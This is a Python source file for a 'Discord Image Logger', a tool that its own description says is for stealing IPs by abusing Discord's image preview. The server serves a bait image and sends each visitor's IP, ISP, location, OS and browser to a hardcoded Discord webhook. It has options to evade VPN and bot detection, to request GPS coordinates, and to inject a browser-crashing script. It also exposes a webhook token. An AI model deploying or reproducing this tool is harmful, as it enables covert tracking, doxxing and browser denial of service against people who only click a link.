# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1107241868271550565/JE5Qf72EOm3xQnsDSi6yLSJGMmfFpUKaYNnNDWYzFR4i8g_mf6Yi9elC-2S1ATukn9zl",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
